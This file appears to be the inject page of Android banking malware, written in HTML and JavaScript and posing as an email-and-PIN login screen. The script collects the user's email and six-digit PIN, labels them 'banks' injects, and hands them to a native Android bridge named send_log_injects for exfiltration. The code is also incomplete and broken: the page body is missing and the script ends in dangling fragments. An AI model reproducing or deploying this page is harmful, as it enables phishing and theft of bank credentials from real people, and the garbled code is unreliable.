<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        #form1, #form2 { 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        #form2 {
            background-color: #000;
        }

        section {
            padding: 20px;
            flex: 1;
        }

        label {
            font-weight: 300;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 1px solid #8d5bb2;
            border-radius: 4px;
            font-weight: bold;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .error { 
            border-color: #f00 !important;
        }

        .button {
            width: 100%;
            padding: 14px;
            background-color: #a543ee;
            color: #fff;
            font-weight: 500;
            font-size: 14px;
            border: 0;
        }

        .fakePass {
            width: 7px;
            height: 7px;
            background-color: #d6d8d5;
            border: 2px solid #d6d8d5;
            border-radius: 75px;
            display: inline-block;
            margin-right: 25px;
        }

        .checked {
            background-color: #000 !important;
            border-color: #000;
        }

        #loginDublikat {
            text-align: center;
            font-weight: 100;
            margin: 0;
        }

        #editMail {
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            color: #a543ee;
            cursor: pointer;
        }

        #form2 > header {
            flex: 1;
            background-color: #fff;
        }

        #form2 > footer {
            background-color: #000;
        }

        .asd {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            grid-gap: 20px;
            margin: 0 auto;
            text-align: center;
        }

        span.pinpad-item {
            color: #fff;
            padding: 20px 0px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            margin-top: -14px;
            cursor: pointer;
        }
    </style>
</head>

    <script>

        var login = document.getElementById('login'),
            loginDublikat = document.getElementById('loginDublikat');

        var nextPage = document.getElementById('nextPage');

        var editMail = document.getElementById('editMail');

        editMail.onclick = () => {
            form2.style.display = 'none';
            form1.style.display = 'flex';
            login.focus()
        }

        nextPage.onclick = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');

                loginDublikat.innerHTML = login.value;
                form1.style.display = 'none';
                form2.style.display = 'flex';
            }
        }

        app = angular.module('app', [])
        app.controller('c1', ['$scope', function ($scope) {
            $sc_ = $scope
            $scope.pin = ""
            $scope.edit_pin = function (password) {
                if ($scope.pin.length != 6) {
                    try{
                        document.getElementById('input_next2').disabled = false;
                    } catch(e){};
                    $scope.pin += '' + password;
                    $("#pin").val($scope.pin);
                }

                if ($scope.pin.length === 6) {
                    var data = {};
                    data.email = login.value;
                    data.password = pin.value;
                    data.type_injects = "banks";
                    data.closed = "close_activity_injects";

                    var ua = navigator.userAgent.toLowerCase();
                    if(ua.indexOf("android") > -1) {
                        try {
                            Android.send_log_injects(JSON.stringify(data))
                        } catch (err) {}
                    }else{
                        alert(JSON.stringify(data));
                    }
                }
            }
            $scope.reset = function () {
                Rlast = $scope.pin.substring(0, $scope.pin.length - 1);
                $scope.pin = Rlast;
                $("#pin").val(Rlast);
            }
        }])

            fake4 = document.getElementById('fake4'),

            for(var i = 1; i <= 10; i++){
